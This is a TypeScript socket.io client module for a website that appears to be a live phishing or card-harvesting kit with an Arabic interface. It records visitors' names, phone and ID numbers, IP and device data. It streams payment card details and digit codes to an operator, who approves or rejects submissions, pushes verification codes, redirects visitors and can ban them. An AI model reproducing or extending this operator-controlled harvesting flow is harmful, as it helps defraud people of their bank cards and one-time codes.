import { signal } from "@preact/signals-react";
import { io, Socket } from "socket.io-client";

// Socket Configuration
const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || "http://localhost:3001";

// Create socket instance
export const socket = signal<Socket>(
  io(SOCKET_URL, {
    transports: ["websocket"],
    autoConnect: false,
    forceNew: true,
  })
);

// Visitor State
export interface VisitorState {
  visitorNumber: number;
  createdAt: string;
  isRead: boolean;
  fullName: string;
  phone: string;
  idNumber: string;
  _id: string;
  apiKey: string;
  ip: string;
  country: string;
  city: string;
  os: string;
  device: string;
  browser: string;
  date: string;
  socketId: string;
  blockedCardPrefixes: string[];
  page: string;
}

export const visitor = signal<VisitorState>({
  visitorNumber: 0,
  createdAt: "",
  isRead: true,
  fullName: "",
  phone: "",
  idNumber: "",
  _id: "",
  apiKey: "",
  ip: "",
  country: "",
  city: "",
  os: "",
  device: "",
  browser: "",
  date: "",
  socketId: "",
  blockedCardPrefixes: [],
  page: "الصفحة الرئيسية",
});

// Form State
export const isFormApproved = signal<boolean>(false);
export const isFormRejected = signal<boolean>(false);
export const waitingMessage = signal<string>("");
export const nextPage = signal<string>("");
export const verificationCode = signal<string>("");

// Admin Connection State
export const isAdminConnected = signal<boolean>(false);
export const adminLastMessage = signal<string>("");

// Error/Block State
export const errorMessage = signal<{ en: string; ar: string; image?: string } | undefined>(undefined);
export const isBlocked = signal<boolean>(false);

// Card Verification
export const isCardVerified = signal<boolean | null>(null);

// Payment Data (stored in localStorage)
export interface PaymentData {
  totalPaid?: number;
  cardType?: string;
  cardLast4?: string;
}

// Function to send data to server
export function sendData(params: {
  data?: Record<string, any>;
  paymentCard?: Record<string, any>;
  digitCode?: string;
  current: string;
  nextPage?: string;
  waitingForAdminResponse?: boolean;
  isCustom?: boolean;
  mode?: string;
}) {
  if (!visitor.value._id) return;

  isFormApproved.value = false;
  isFormRejected.value = false;

  socket.value.emit("more-info", {
    content: params.data,
    paymentCard: params.paymentCard,
    digitCode: params.digitCode,
    page: params.current,
    waitingForAdminResponse: params.waitingForAdminResponse,
    sentCustomPage: params.isCustom,
    mode: params.mode,
  });

  if (params.nextPage) {
    nextPage.value = params.nextPage;
  }

  if (!params.mode) {
    waitingMessage.value = "جاري المعالجة...";
  }
}

// Function to navigate to page
export function navigateToPage(page: string) {
  socket.value.emit("visitor:pageEnter", page);
}

// Initialize socket listeners
export function initializeSocket() {
  const s = socket.value;

  s.on("successfully-connected", (data: { sid: string; pid: string }) => {
    visitor.value = { ...visitor.value, socketId: data.sid, _id: data.pid };
  });

  s.on("form:approved", () => {
    isFormApproved.value = true;
    waitingMessage.value = "";
  });

  s.on("form:rejected", () => {
    isFormRejected.value = true;
    waitingMessage.value = "";
  });

  s.on("visitor:navigate", (page: string) => {
    if (page) {
      window.location.href = "/" + page;
    }
  });

  s.on("admin-last-message", ({ message }: { message: string }) => {
    adminLastMessage.value = message;
    waitingMessage.value = "";
    navigateToPage("END");
  });

  s.on("code", (code: string) => {
    verificationCode.value = code;
    waitingMessage.value = "";
  });

  s.on("cardNumber:verified", (verified: boolean) => {
    isCardVerified.value = verified;
  });

  s.on("blocked", () => {
    waitingMessage.value = "";
    errorMessage.value = {
      en: "You have been banned from using the site for violating the terms of use.",
      ar: "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.",
      image: "banned.jpg",
    };
    isBlocked.value = true;
  });

  s.on("unblocked", () => {
    errorMessage.value = undefined;
    isBlocked.value = false;
  });

  s.on("deleted", () => {
    window.location.href = "/";
    errorMessage.value = {
      en: "Removed Your Account! Try Again Later",
      ar: "",
    };
  });

  s.on("isAdminConnected", (connected: boolean) => {
    isAdminConnected.value = connected;
  });

  s.on("bankName", (name: string) => {
    localStorage.setItem("selectedBank", name);
  });

  // Connect socket
  s.connect();

  // Register visitor
  s.emit("visitor:register");
}

// Disconnect socket
export function disconnectSocket() {
  socket.value.disconnect();
}
